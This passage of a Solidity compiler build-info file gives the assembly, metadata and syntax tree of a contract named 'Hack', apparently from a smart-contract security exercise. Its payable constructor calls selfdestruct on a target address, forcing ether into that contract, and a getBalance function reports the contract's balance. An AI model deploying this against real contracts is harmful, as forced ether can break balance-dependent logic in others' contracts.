									"begin": 80,
									"end": 164,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 80,
									"end": 164,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 80,
									"end": 164,
									"name": "JUMP",
									"source": 0,
									"value": "[in]"
								},
								{
									"begin": 80,
									"end": 164,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 80,
									"end": 164,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 148,
									"end": 155,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 135,
									"end": 156,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 135,
									"end": 156,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 135,
									"end": 156,
									"name": "SELFDESTRUCT",
									"source": 0
								},
								{
									"begin": 7,
									"end": 166,
									"name": "tag",
									"source": 1,
									"value": "7"
								},
								{
									"begin": 7,
									"end": 166,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 7,
									"end": 166,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 103,
									"end": 109,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 97,
									"end": 110,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 88,
									"end": 110,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 88,
									"end": 110,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 119,
									"end": 160,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 154,
									"end": 159,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 119,
									"end": 160,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 119,
									"end": 160,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 119,
									"end": 160,
									"name": "tag",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 119,
									"end": 160,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 78,
									"end": 166,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 78,
									"end": 166,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 78,
									"end": 166,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 78,
									"end": 166,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 78,
									"end": 166,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 172,
									"end": 472,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 172,
									"end": 472,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 172,
									"end": 472,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 299,
									"end": 301,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 287,
									"end": 296,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 278,
									"end": 285,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 274,
									"end": 297,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 270,
									"end": 302,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 267,
									"end": 269,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 267,
									"end": 269,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 267,
									"end": 269,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 315,
									"end": 316,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 312,
									"end": 313,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 305,
									"end": 317,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 267,
									"end": 269,
									"name": "tag",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 267,
									"end": 269,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 358,
									"end": 359,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 383,
									"end": 455,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 447,
									"end": 454,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 438,
									"end": 444,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 427,
									"end": 436,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 423,
									"end": 445,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 383,
									"end": 455,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "7"
								},
								{
									"begin": 383,
									"end": 455,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 383,
									"end": 455,
									"name": "tag",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 383,
									"end": 455,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 373,
									"end": 455,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 373,
									"end": 455,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 329,
									"end": 465,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 257,
									"end": 472,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 257,
									"end": 472,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 257,
									"end": 472,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 257,
									"end": 472,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 257,
									"end": 472,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 478,
									"end": 582,
									"name": "tag",
									"source": 1,
									"value": "14"
								},
								{
									"begin": 478,
									"end": 582,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 478,
									"end": 582,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 552,
									"end": 576,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "16"
								},
								{
									"begin": 570,
									"end": 575,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 552,
									"end": 576,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "17"
								},
								{
									"begin": 552,
									"end": 576,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 552,
									"end": 576,
									"name": "tag",
									"source": 1,
									"value": "16"
								},
								{
									"begin": 552,
									"end": 576,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 541,
									"end": 576,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 541,
									"end": 576,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 531,
									"end": 582,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 531,
									"end": 582,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 531,
									"end": 582,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 531,
									"end": 582,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 588,
									"end": 714,
									"name": "tag",
									"source": 1,
									"value": "17"
								},
								{
									"begin": 588,
									"end": 714,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 588,
									"end": 714,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 665,
									"end": 707,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 658,
									"end": 663,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 654,
									"end": 708,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 643,
									"end": 708,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 643,
									"end": 708,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 633,
									"end": 714,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 633,
									"end": 714,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 633,
									"end": 714,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 633,
									"end": 714,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 720,
									"end": 858,
									"name": "tag",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 720,
									"end": 858,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 801,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 827,
									"end": 832,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 801,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "14"
								},
								{
									"begin": 801,
									"end": 833,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 801,
									"end": 833,
									"name": "tag",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 801,
									"end": 833,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 794,
									"end": 799,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 791,
									"end": 834,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 781,
									"end": 783,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "21"
								},
								{
									"begin": 781,
									"end": 783,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 848,
									"end": 849,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 845,
									"end": 846,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 838,
									"end": 850,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 781,
									"end": 783,
									"name": "tag",
									"source": 1,
									"value": "21"
								},
								{
									"begin": 781,
									"end": 783,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 771,
									"end": 858,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 771,
									"end": 858,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220bae0b30163b15275136bd4a17b53cfefd13f6c03d49d08c301de4764404bb5ff64736f6c63430008000033",
									".code": [
										{
											"begin": 60,
											"end": 269,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 60,
											"end": 269,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 60,
											"end": 269,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 60,
											"end": 269,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 269,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 60,
											"end": 269,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 60,
											"end": 269,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 60,
											"end": 269,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 269,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 60,
											"end": 269,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "PUSH",
											"source": 0,
											"value": "12065FE0"
										},
										{
											"begin": 60,
											"end": 269,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 60,
											"end": 269,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 60,
											"end": 269,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 269,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 269,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 170,
											"end": 266,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 170,
											"end": 266,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 170,
											"end": 266,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 170,
											"end": 266,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 170,
											"end": 266,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 170,
											"end": 266,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 170,
											"end": 266,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 170,
											"end": 266,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 170,
											"end": 266,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 170,
											"end": 266,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 170,
											"end": 266,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 170,
											"end": 266,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 214,
											"end": 218,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 237,
											"end": 258,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 230,
											"end": 258,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 230,
											"end": 258,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 170,
											"end": 266,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 125,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 7,
											"end": 125,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 94,
											"end": 118,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 112,
											"end": 117,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 94,
											"end": 118,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 94,
											"end": 118,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 94,
											"end": 118,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 94,
											"end": 118,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 89,
											"end": 92,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 82,
											"end": 119,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 72,
											"end": 125,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 72,
											"end": 125,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 72,
											"end": 125,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 131,
											"end": 353,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 131,
											"end": 353,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 131,
											"end": 353,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 262,
											"end": 264,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 251,
											"end": 260,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 247,
											"end": 265,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 239,
											"end": 265,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 239,
											"end": 265,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 275,
											"end": 346,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 343,
											"end": 344,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 332,
											"end": 341,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 328,
											"end": 345,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 319,
											"end": 325,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 275,
											"end": 346,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 275,
											"end": 346,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 275,
											"end": 346,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 275,
											"end": 346,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 229,
											"end": 353,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 229,
											"end": 353,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 229,
											"end": 353,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 229,
											"end": 353,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 229,
											"end": 353,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 359,
											"end": 436,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 359,
											"end": 436,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 359,
											"end": 436,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 425,
											"end": 430,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 414,
											"end": 430,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 414,
											"end": 430,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 404,
											"end": 436,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 404,
											"end": 436,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 404,
											"end": 436,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 404,
											"end": 436,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"getBalance()": "12065fe0"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_target\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"Contracts/Hack.sol\":\"Hack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"Contracts/Hack.sol\":{\"keccak256\":\"0x21cdfd832f55effdfe05b3d39a7fbd67d092d215e3b1f2e9e83e636612aee3e8\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://c9a21c6fcfc2b2d19b1ee606295266bc93a3514293e01e1d4607701a9e39c595\",\"dweb:/ipfs/QmSjpHoeCv5foP5ZTi2vBYV5JjH76aWLLxhs85xP1itNN3\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"Contracts/Hack.sol": {
				"ast": {
					"absolutePath": "Contracts/Hack.sol",
					"exportedSymbols": {
						"Hack": [
							24
						]
					},
					"id": 25,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 24,
							"linearizedBaseContracts": [
								24
							],
							"name": "Hack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 10,
										"nodeType": "Block",
										"src": "124:40:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"id": 7,
															"name": "_target",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 3,
															"src": "148:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 6,
														"name": "selfdestruct",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4294967275,
														"src": "135:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
															"typeString": "function (address payable)"
														}
													},
													"id": 8,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "135:21:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 9,
												"nodeType": "ExpressionStatement",
												"src": "135:21:0"
											}
										]
									},
									"id": 11,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 4,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 3,
												"mutability": "mutable",
												"name": "_target",
												"nodeType": "VariableDeclaration",
												"scope": 11,
												"src": "92:23:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												},
												"typeName": {
													"id": 2,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "92:15:0",
													"stateMutability": "payable",
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "91:25:0"
									},
									"returnParameters": {
										"id": 5,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "124:0:0"
									},
									"scope": 24,
									"src": "80:84:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 22,
										"nodeType": "Block",
										"src": "219:47:0",
										"statements": [
											{
												"expression": {
													"expression": {
														"arguments": [
															{
																"id": 18,
																"name": "this",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967268,
																"src": "245:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_Hack_$24",
																	"typeString": "contract Hack"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_contract$_Hack_$24",
																	"typeString": "contract Hack"
																}
															],
															"id": 17,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "237:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": {
																"id": 16,
																"name": "address",
																"nodeType": "ElementaryTypeName",
																"src": "237:7:0",
																"typeDescriptions": {}
															}
														},
														"id": 19,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "237:13:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"id": 20,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "balance",
													"nodeType": "MemberAccess",
													"src": "237:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 15,
												"id": 21,
												"nodeType": "Return",
												"src": "230:28:0"
											}
										]
									},
									"functionSelector": "12065fe0",
									"id": 23,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getBalance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 12,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "189:2:0"
									},
									"returnParameters": {
										"id": 15,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 14,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 23,
												"src": "214:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 13,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "214:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "213:6:0"
									},
									"scope": 24,
									"src": "170:96:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 25,
							"src": "60:209:0"
						}
					],
					"src": "33:236:0"
				},
				"id": 0
			}
		}
	}
}